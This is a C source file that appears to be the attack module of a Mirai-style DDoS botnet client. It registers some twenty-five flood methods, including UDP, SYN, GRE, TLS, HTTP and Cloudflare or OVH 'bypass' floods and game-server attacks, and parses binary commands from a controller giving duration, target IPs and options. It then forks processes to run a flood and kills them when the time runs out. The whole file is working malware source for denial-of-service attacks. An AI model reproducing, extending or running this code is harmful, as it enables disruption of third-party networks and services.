#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <errno.h>

#include "includes.h"
#include "attack.h"
#include "rand.h"
#include "util.h"

uint8_t methods_len = 0;
struct attack_method **methods = NULL;
int attack_ongoing[ATTACK_CONCURRENT_MAX] = {0};

BOOL attack_init(void)
{
    add_attack(ATK_VEC_UDP, (ATTACK_FUNC)attack_udp_generic);
    add_attack(ATK_VEC_VSE, (ATTACK_FUNC)attack_udp_vse);
    add_attack(ATK_VEC_UDP_PLAIN, (ATTACK_FUNC)attack_udp_plain);

    add_attack(ATK_VEC_SYN, (ATTACK_FUNC)attack_tcp_syn);
    add_attack(ATK_VEC_ACK, (ATTACK_FUNC)attack_tcp_ack);
    add_attack(ATK_VEC_STOMP, (ATTACK_FUNC)attack_tcp_stomp);
    add_attack(ATK_VEC_TCP_BYPASS, (ATTACK_FUNC)attack_tcp_bypass);
    add_attack(ATK_VEC_LEGIT, (ATTACK_FUNC)attack_tcp_legit);
    add_attack(ATK_VEC_SOCKET, (ATTACK_FUNC)attack_tcp_socket);

    add_attack(ATK_VEC_GREIP, (ATTACK_FUNC)attack_gre_ip);
    add_attack(ATK_VEC_GREETH, (ATTACK_FUNC)attack_gre_eth);
    add_attack(ATK_VEC_UDP_BYPASS, (ATTACK_FUNC)attack_udp_bypass);
    add_attack(ATK_VEC_STD, (ATTACK_FUNC)attack_std);
    add_attack(ATK_VEC_RAKNET, (ATTACK_FUNC)attack_raknet);
    add_attack(ATK_VEC_ESP, (ATTACK_FUNC)attack_esp);
    add_attack(ATK_VEC_UDPHEX, (ATTACK_FUNC)attack_udp_hex);
    add_attack(ATK_VEC_FIVEM, (ATTACK_FUNC)attack_fivem);
    add_attack(ATK_VEC_DISCORD, (ATTACK_FUNC)attack_discord);
    add_attack(ATK_VEC_HTTP, (ATTACK_FUNC)attack_http);
    add_attack(ATK_VEC_PPS, (ATTACK_FUNC)attack_pps);
    add_attack(ATK_VEC_TLS, (ATTACK_FUNC)attack_tls);
    add_attack(ATK_VEC_TLSPLUS, (ATTACK_FUNC)attack_tlsplus);
    add_attack(ATK_VEC_CLOUDFLARE, (ATTACK_FUNC)attack_cloudflare);
    add_attack(ATK_VEC_NERV_L7, (ATTACK_FUNC)attack_nerv_l7);
    add_attack(ATK_VEC_OVH, (ATTACK_FUNC)attack_ovh);
    return TRUE;
}

void attack_kill_all(void)
{

#ifdef DEBUG
    printf("[attack] Killing all ongoing attacks\n");
#endif

    for (int i = 0; i < ATTACK_CONCURRENT_MAX; i++)
    {
        if (attack_ongoing[i] != 0)
            kill(attack_ongoing[i], 9);
        attack_ongoing[i] = 0;
    }

    
    
}


void attack_parse(char *buf, int len)
{
    int i;
    uint32_t duration;
    ATTACK_VECTOR vector;
    uint8_t targs_len, opts_len;
    struct attack_target *targs = NULL;
    struct attack_option *opts = NULL;

    
    if (len < sizeof (uint32_t))
        goto cleanup;
    duration = (buf[0] << 24) | (buf[1] << 16) | (buf[2] << 8) | (buf[3] << 0);
    buf += sizeof (uint32_t);
    len -= sizeof (uint32_t);


    
    if (len == 0)
        goto cleanup;
    vector = (ATTACK_VECTOR)*buf++;
    len -= sizeof (uint8_t);


    
    if (len == 0)
        goto cleanup;
    targs_len = (uint8_t)*buf++;
    len -= sizeof (uint8_t);
    if (targs_len == 0)
        goto cleanup;

    
    if (len < ((sizeof (ipv4_t) + sizeof (uint8_t)) * targs_len))
        goto cleanup;
    targs = calloc(targs_len, sizeof (struct attack_target));
    for (i = 0; i < targs_len; i++)
    {
        targs[i].addr = *((ipv4_t *)buf);
        buf += sizeof (ipv4_t);
        targs[i].netmask = (uint8_t)*buf++;
        len -= (sizeof (ipv4_t) + sizeof (uint8_t));

        targs[i].sock_addr.sin_family = AF_INET;
        targs[i].sock_addr.sin_addr.s_addr = targs[i].addr;
    }

    
    if (len < sizeof (uint8_t))
        goto cleanup;
    opts_len = (uint8_t)*buf++;
    len -= sizeof (uint8_t);

    
    if (opts_len > 0)
    {
        opts = calloc(opts_len, sizeof (struct attack_option));
        for (i = 0; i < opts_len; i++)
        {
            uint8_t val_len;

            
            if (len < sizeof (uint8_t))
                goto cleanup;
            opts[i].key = (uint8_t)*buf++;
            len -= sizeof (uint8_t);

            
            if (len < sizeof (uint8_t))
                goto cleanup;
            val_len = (uint8_t)*buf++;
            len -= sizeof (uint8_t);

            if (len < val_len)
                goto cleanup;
            opts[i].val = calloc(val_len + 1, sizeof (char));
            util_memcpy(opts[i].val, buf, val_len);
            buf += val_len;
            len -= val_len;
        }
    }

    errno = 0;
    attack_start(duration, vector, targs_len, targs, opts_len, opts);

    
    cleanup:
    if (targs != NULL)
        free(targs);
    if (opts != NULL)
        free_opts(opts, opts_len);
}

void attack_start(int duration, ATTACK_VECTOR vector, uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int pid1, pid2;

#ifdef DEBUG
    printf("[attack_start] Forking attack process...\n");
#endif
    pid1 = fork();
    if (pid1 == -1 || pid1 > 0) {
#ifdef DEBUG
        if (pid1 == -1)
            printf("[attack_start] Fork failed!\n");
        else
            printf("[attack_start] Parent returning (child PID: %d)\n", pid1);
#endif
        return;
    }

    pid2 = fork();
    if (pid2 == -1)
        exit(0);

    else if (pid2 == 0)
    {
        sleep(duration);
        kill(getppid(), 9);
        exit(0);
    }
    else
    {
        int i;

        for (i = 0; i < methods_len; i++)
        {
            if (methods[i]->vector == vector)
            {
                #ifdef DEBUG
                    printf("[attack] Starting attack...\n");
                #endif
                methods[i]->func(targs_len, targs, opts_len, opts);
                break;
            }
        }

        
        exit(0);
    }
}

char *attack_get_opt_str(uint8_t opts_len, struct attack_option *opts, uint8_t opt, char *def)
{
    int i;

    for (i = 0; i < opts_len; i++)
    {
        if (opts[i].key == opt)
            return opts[i].val;
    }

    return def;
}

int attack_get_opt_int(uint8_t opts_len, struct attack_option *opts, uint8_t opt, int def)
{
    char *val = attack_get_opt_str(opts_len, opts, opt, NULL);

    if (val == NULL)
        return def;
    else
        return util_atoi(val, 10);
}

uint32_t attack_get_opt_ip(uint8_t opts_len, struct attack_option *opts, uint8_t opt, uint32_t def)
{
    char *val = attack_get_opt_str(opts_len, opts, opt, NULL);

    if (val == NULL)
        return def;
    else
        return inet_addr(val);
}

static void add_attack(ATTACK_VECTOR vector, ATTACK_FUNC func)
{
    struct attack_method *method = calloc(1, sizeof (struct attack_method));

    method->vector = vector;
    method->func = func;

    methods = realloc(methods, (methods_len + 1) * sizeof (struct attack_method *));
    methods[methods_len++] = method;
}

static void free_opts(struct attack_option *opts, int len)
{
    int i;

    if (opts == NULL)
        return;

    for (i = 0; i < len; i++)
    {
        if (opts[i].val != NULL)
            free(opts[i].val);
    }
    free(opts);
}
